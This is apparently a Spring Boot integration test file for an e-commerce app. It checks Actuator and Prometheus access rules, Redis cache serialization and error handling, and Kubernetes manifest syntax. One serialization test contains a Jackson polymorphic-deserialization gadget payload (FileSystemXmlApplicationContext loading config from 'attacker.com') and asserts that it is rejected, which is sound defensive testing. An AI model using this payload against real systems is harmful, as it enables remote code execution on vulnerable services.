package com.tienda.ecommerce;

import com.fasterxml.jackson.annotation.JsonTypeInfo;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.fasterxml.jackson.databind.jsontype.BasicPolymorphicTypeValidator;
import com.fasterxml.jackson.databind.jsontype.PolymorphicTypeValidator;
import com.fasterxml.jackson.datatype.jsr310.JavaTimeModule;
import com.tienda.ecommerce.config.CacheConfig;
import com.tienda.ecommerce.producto.dto.CategoriaResponse;
import com.tienda.ecommerce.producto.dto.ProductoResponse;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.AutoConfigureMockMvc;
import org.springframework.boot.test.context.SpringBootTest;
import org.springframework.cache.Cache;
import org.springframework.cache.interceptor.CacheErrorHandler;
import org.springframework.data.redis.connection.RedisConnectionFactory;
import org.springframework.security.test.context.support.WithMockUser;
import org.springframework.test.context.ActiveProfiles;
import org.springframework.test.web.servlet.MockMvc;
import org.yaml.snakeyaml.Yaml;

import java.io.File;
import java.io.FileInputStream;
import java.math.BigDecimal;
import java.time.LocalDateTime;
import java.util.List;
import java.util.Map;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.Mockito.mock;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.*;

@SpringBootTest
@AutoConfigureMockMvc
@ActiveProfiles("test")
class CloudAndMonitoringIntegrationTest {

    @Autowired
    private MockMvc mockMvc;

    // Prueba explícita de la configuración real, sin inyectar un bean excluido por test.
    private final CacheConfig cacheConfig = new CacheConfig();

    @Test
    @DisplayName("Actuator: /actuator/health es público y responde UP")
    void actuatorHealth_esPublico_yRetornaUP() throws Exception {
        mockMvc.perform(get("/actuator/health"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));
    }

    @Test
    @DisplayName("Actuator: /actuator/health/liveness es público para Kubernetes")
    void actuatorLiveness_esPublico() throws Exception {
        mockMvc.perform(get("/actuator/health/liveness"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));
    }

    @Test
    @DisplayName("Actuator: /actuator/health/readiness es público para Kubernetes")
    void actuatorReadiness_esPublico() throws Exception {
        mockMvc.perform(get("/actuator/health/readiness"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$.status").value("UP"));
    }

    @Test
    @DisplayName("Prometheus: /actuator/prometheus está protegido sin autenticación (403 Forbidden)")
    void actuatorPrometheus_sinAuth_debeSerDenegado() throws Exception {
        mockMvc.perform(get("/actuator/prometheus"))
                .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(authorities = "CLIENTE")
    @DisplayName("Prometheus: /actuator/prometheus denegado para usuario normal sin permiso de admin (403 Forbidden)")
    void actuatorPrometheus_conRolInadecuado_debeSerDenegado() throws Exception {
        mockMvc.perform(get("/actuator/prometheus"))
                .andExpect(status().isForbidden());
    }

    @Test
    @WithMockUser(authorities = "CONFIGURACION_GESTIONAR")
    @DisplayName("Prometheus: /actuator/prometheus responde 200 y métricas en formato prometheus con permiso administrativo")
    void actuatorPrometheus_conPermisoAdmin_retornaMetricas() throws Exception {
        var result = mockMvc.perform(get("/actuator/prometheus"))
                .andReturn();
        System.out.println("PROMETHEUS STATUS: " + result.getResponse().getStatus());
        System.out.println("PROMETHEUS BODY (first 200 chars): " + 
                (result.getResponse().getContentAsString().length() > 200 ? 
                 result.getResponse().getContentAsString().substring(0, 200) : 
                 result.getResponse().getContentAsString()));
        assertEquals(200, result.getResponse().getStatus());
        assertTrue(result.getResponse().getContentAsString().contains("jvm_memory_used_bytes") 
                || result.getResponse().getContentAsString().contains("process_uptime_seconds")
                || result.getResponse().getContentAsString().contains("# TYPE"));
    }

    @Test
    @WithMockUser(authorities = "CONFIGURACION_GESTIONAR")
    @DisplayName("Actuator: Endpoint base /actuator responde 200 para administradores")
    void actuatorDiscovery() throws Exception {
        mockMvc.perform(get("/actuator"))
                .andExpect(status().isOk())
                .andExpect(jsonPath("$._links").exists())
                .andExpect(jsonPath("$._links.prometheus").exists());
    }

    @Test
    @DisplayName("Actuator: endpoints no permitidos están bloqueados por defecto (denyAll)")
    void actuatorOtrosEndpoints_bloqueadosPorDefecto() throws Exception {
        mockMvc.perform(get("/actuator/beans"))
                .andExpect(status().isForbidden());
    }

    @Test
    @DisplayName("CacheConfig: Validación de serialización polimórfica segura con DTOs de catálogo")
    void cacheConfig_serializacionSegura() throws Exception {
        RedisConnectionFactory mockFactory = mock(RedisConnectionFactory.class);
        var manager = cacheConfig.cacheManager(mockFactory);
        assertNotNull(manager);

        var serializer = CacheConfig.catalogSerializer();

        // 1. CategoriaResponse
        CategoriaResponse cat = new CategoriaResponse(1L, "Audio", "Equipos de sonido");
        String jsonCat = new String(serializer.serialize(cat), java.nio.charset.StandardCharsets.UTF_8);
        assertTrue(jsonCat.contains("@class"), "Debe incluir información de tipo para Jackson polymorphic typing");
        CategoriaResponse deserializedCat = (CategoriaResponse) serializer.deserialize(serializer.serialize(cat));
        assertEquals(cat.getId(), deserializedCat.getId());
        assertEquals(cat.getNombre(), deserializedCat.getNombre());

        // 2. ProductoResponse
        ProductoResponse prod = new ProductoResponse(
                1L, "Audífonos Bluetooth", "Descripción",
                new BigDecimal("99.90"), 10, "img.jpg",
                List.of("img.jpg", "img2.jpg"), 1L, "Audio", true, LocalDateTime.now()
        );
        String jsonProd = new String(serializer.serialize(prod), java.nio.charset.StandardCharsets.UTF_8);
        assertTrue(jsonProd.contains("@class"));
        ProductoResponse deserializedProd = (ProductoResponse) serializer.deserialize(serializer.serialize(prod));
        assertEquals(prod.getId(), deserializedProd.getId());
        assertEquals(prod.getNombre(), deserializedProd.getNombre());
        assertEquals(prod.getImagenes().size(), deserializedProd.getImagenes().size());

        // 3. Intento de deserialización de clase no permitida (Mitigación RCE)
        String maliciousPayload = "{\"@class\":\"org.springframework.context.support.FileSystemXmlApplicationContext\",\"configLocation\":\"http://attacker.com\"}";
        assertThrows(Exception.class, () -> serializer.deserialize(maliciousPayload.getBytes(java.nio.charset.StandardCharsets.UTF_8)));
        // Una clase inocua pero fuera de la lista también debe ser rechazada.
        assertThrows(Exception.class, () -> serializer.deserialize(
                "{\"@class\":\"java.util.Date\",\"value\":0}".getBytes(java.nio.charset.StandardCharsets.UTF_8)));
        var lista = List.of(cat).stream().toList();
        assertEquals("Audio", ((CategoriaResponse) ((List<?>) serializer.deserialize(serializer.serialize(lista))).get(0)).getNombre());
    }

    @Test
    @DisplayName("CacheConfig: Manejador de errores permite Graceful Degradation en GET y propaga en EVICT")
    void cacheConfig_errorHandler_gracefulDegradation() {
        CacheErrorHandler errorHandler = cacheConfig.errorHandler();
        assertNotNull(errorHandler);
        Cache mockCache = mock(Cache.class);

        // GET: Debe degradar suavemente sin lanzar excepción al cliente
        assertDoesNotThrow(() -> errorHandler.handleCacheGetError(
                new RuntimeException("Redis connection refused"), mockCache, "key-123"));

        // EVICT: Debe propagar el error para evitar inconsistencias de datos/stock
        assertThrows(RuntimeException.class, () -> errorHandler.handleCacheEvictError(
                new RuntimeException("Redis timeout en eviction"), mockCache, "key-123"));
    }

    @Test
    @DisplayName("Kubernetes: Validación de sintaxis e integridad de manifiestos YAML en k8s/")
    void k8s_manifiestos_sintaxisEIntegridad() throws Exception {
        File k8sDir = new File("k8s");
        assertTrue(k8sDir.exists() && k8sDir.isDirectory(), "La carpeta k8s/ debe existir");

        File[] files = k8sDir.listFiles((dir, name) -> name.endsWith(".yaml") || name.endsWith(".yml"));
        assertNotNull(files);
        assertTrue(files.length >= 6, "Deben existir al menos 6 manifiestos base en k8s/");

        Yaml yaml = new Yaml();
        int totalDocumentos = 0;

        for (File file : files) {
            try (FileInputStream fis = new FileInputStream(file)) {
                Iterable<Object> docs = yaml.loadAll(fis);
                for (Object doc : docs) {
                    if (doc instanceof Map<?, ?> map) {
                        totalDocumentos++;
                        assertTrue(map.containsKey("apiVersion"), "El archivo " + file.getName() + " debe tener apiVersion");
                        assertTrue(map.containsKey("kind"), "El archivo " + file.getName() + " debe tener kind");
                    }
                }
            }
        }
        assertTrue(totalDocumentos >= 8, "Deben procesarse al menos 8 documentos YAML en k8s/");
    }
}
